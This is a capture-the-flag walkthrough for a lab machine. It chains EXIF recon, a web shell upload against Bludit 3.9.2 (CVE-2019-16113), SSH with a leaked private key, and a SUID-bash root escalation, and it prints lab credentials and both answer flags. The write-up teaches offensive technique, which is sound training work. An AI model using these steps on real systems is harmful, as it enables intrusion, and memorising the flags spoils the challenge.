# 🏴‍☠️ SKYSEC CTF — Vaultline Tech: Project Whisker

> **Difficulty:** Multi-stage | **Category:** Web · Lateral Movement · Privilege Escalation  
> **Author:** SKYSEC

---

## 📋 Table of Contents

- [Machine Summary](#machine-summary)
- [Environment Info](#environment-info)
- [Stage 1 — OSINT & Initial Recon](#stage-1--osint--initial-recon)
- [Stage 2 — Web Enumeration & RCE](#stage-2--web-enumeration--rce)
- [Stage 3 — Container Escape & Lateral Movement](#stage-3--container-escape--lateral-movement)
- [Stage 4 — Privilege Escalation](#stage-4--privilege-escalation)
- [Flags Summary](#flags-summary)

---

## Machine Summary

**Vaultline Tech — Project Whisker** is a multi-stage penetration testing machine based on real-world attack scenarios. The full attack chain is as follows:

1. **OSINT** — EXIF metadata analysis of a socially-engineered image file
2. **Initial Access** — RCE via Bludit CMS v3.9.2 (CVE-2019-16113)
3. **Lateral Movement** — Container escape using a forgotten SSH key found inside the Docker container
4. **Privilege Escalation** — SUID-bit backdoor identified via reverse engineering with `strings`

---

## Environment Info

| Field | Value |
|---|---|
| Target IP | `192.168.86.129` |
| Web Port | `5353` |
| CMS | Bludit v3.9.2 |
| Server Hostname | `vaultline-server` |
| Server User | `vaultline` |
| Docker Container Name | `vaultline-web` (ID: `76100c11c213`) |
| Docker Image | `bludit/docker:3.9.2` |

---

## Stage 1 — OSINT & Initial Recon

The starting point of the machine does not provide a target IP or port directly. Instead, the target company's PR team has published an image file named `hacker_cat.png`. After downloading the file, `exiftool` is used to analyze its embedded metadata:

```bash
exiftool hacker_cat.png
```

Buried in the output is a comment field revealing the target server's address and port:

```
Comment: Vaultline Tech Dev Server: http://192.168.86.129:5353
```

**Finding:** The web service is running on port `5353`.

---

## Stage 2 — Web Enumeration & RCE

### Directory Fuzzing

Navigating to the discovered address reveals a **Bludit CMS (v3.9.2)** instance. Directory fuzzing is performed to identify hidden files and paths:

```bash
gobuster dir -u http://192.168.86.129:5353 -w /usr/share/wordlists/dirb/common.txt
```

A forgotten developer log file is discovered at `/dev/debug.log`:

```
/var/www/html/dev/debug.log
```

**Log file contents:**

```
TODO: Vaultline Tech portalini canliya almadan once bu dizini sil!
Gecici test credentiallari -> admin : Vaultline_Dev26!
```

These credentials are used to log into the CMS admin panel at `http://192.168.86.129:5353/admin/`.

### Exploitation — CVE-2019-16113

Bludit v3.9.2 is vulnerable to a **Directory Traversal + Remote Code Execution** vulnerability. Using a Python PoC or Metasploit module, a crafted PHP web shell (`evil.png`) and a triggering `.htaccess` file are uploaded to the server's temporary directory (`/bl-content/tmp/temp/`).

Upon triggering the payload, a shell is obtained inside the Docker container as `www-data`.

---

## Stage 3 — Container Escape & Lateral Movement

While enumerating the container filesystem as `www-data`, the `/var/www/html/dev/` directory is found to contain not only the log file, but also a **private SSH key** left behind in the production environment:

```bash
ls -la /var/www/html/dev/
```

```
-rw-r--r-- 1 www-data www-data 1675 Apr 10 10:00 debug.log
-rw-r--r-- 1 www-data www-data 2602 Apr 10 10:00 vaultline_key.bak
```

The key is copied to the attacker's machine. After setting correct permissions, an SSH connection to the host is established:

```bash
chmod 600 vaultline_key.bak
ssh -i vaultline_key.bak vaultline@192.168.86.129
```

The **User Flag** is read from the home directory:

```bash
vaultline@vaultline-server:~$ cat user.txt
```

```
SKYDAYS{v4ultl1n3_1n1t14l_4cc3ss_gr4nt3d}
```

---

## Stage 4 — Privilege Escalation

While enumerating the `vaultline` user's home directory, a suspicious executable owned by `root` named `analyze_me` is found. Running it directly results in an access error:

```bash
vaultline@vaultline-server:~$ ./analyze_me
Vaultline Güvenlik Protokolü Aktif. Erişim Reddedildi!
```

The `strings` command is used to identify any hidden parameters or logic:

```bash
vaultline@vaultline-server:~$ strings analyze_me
```

**Relevant output (truncated):**

```
...
[BAZI_GEREKSIZ_METINLER]
...
SYSTEM_CORE_OVERRIDE: /opt/.core -p
```

Inspecting `/opt/.core` reveals it is a **SUID-bit copy of bash** planted by root. It is triggered with the `-p` flag to preserve root privileges:

```bash
vaultline@vaultline-server:~$ /opt/.core -p
```

A root shell is obtained immediately. The **Root Flag** is read from `/root/`:

```bash
analyze_me-root# whoami
root

analyze_me-root# cat /root/pfx_root.txt
SKYDAYS{su1d_b4ckd00r_r3v3rs3_c0r3_4cc3ss}
```

---

## Flags Summary

| Flag | Path | Value |
|---|---|---|
| User Flag | `~/user.txt` | `SKYDAYS{v4ultl1n3_1n1t14l_4cc3ss_gr4nt3d}` |
| Root Flag | `/root/pfx_root.txt` | `SKYDAYS{su1d_b4ckd00r_r3v3rs3_c0r3_4cc3ss}` |
